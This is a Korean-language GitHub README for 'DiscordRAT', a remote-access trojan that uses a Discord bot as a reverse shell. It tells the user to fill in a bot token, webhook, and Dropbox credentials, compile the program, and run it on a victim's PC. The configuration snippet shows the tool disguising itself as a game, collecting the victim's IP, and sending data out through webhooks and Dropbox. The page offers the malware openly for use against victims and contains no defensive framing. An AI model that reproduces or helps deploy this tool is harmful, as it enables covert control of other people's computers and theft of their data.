![venom](https://capsule-render.vercel.app/api?type=venom&height=200&text=DiscordRAT&fontSize=70&color=0:8871e5,100:b678c4&stroke=b678c4)

Discord.NET 을 이용한 reverse shell
## Usage
[필수값](https://github.com/root1234567891234/Discrod_Rat/blob/master/AntiMalware/class/value.cs)을 수정해 봇,후크와 연동한후 컴파일 그리고 피해자PC에서 실행시키세요
```C# 8
private static GET GET = new GET();
// 본 프로그램의 이름
public string filename = "";
// 실제 게임의 위치
public string path = "";
// 프로그램 버전
public string version = " | 2.23v";
// 디스코드 봇 토큰
public string bot_token = "";
// 웹훅링크
public string EndPoint =
@"";
// ip
public string ip = GET.ip();
// 드랍박스 연결
public DropboxClient dropbox_ = new DropboxClient(
                                      oauth2RefreshToken: "",
                                      appKey: "",
                                      appSecret: "");
// 웹에 post를 보내기위한 HttpClient선언
public HttpClient client_ = new HttpClient();
```
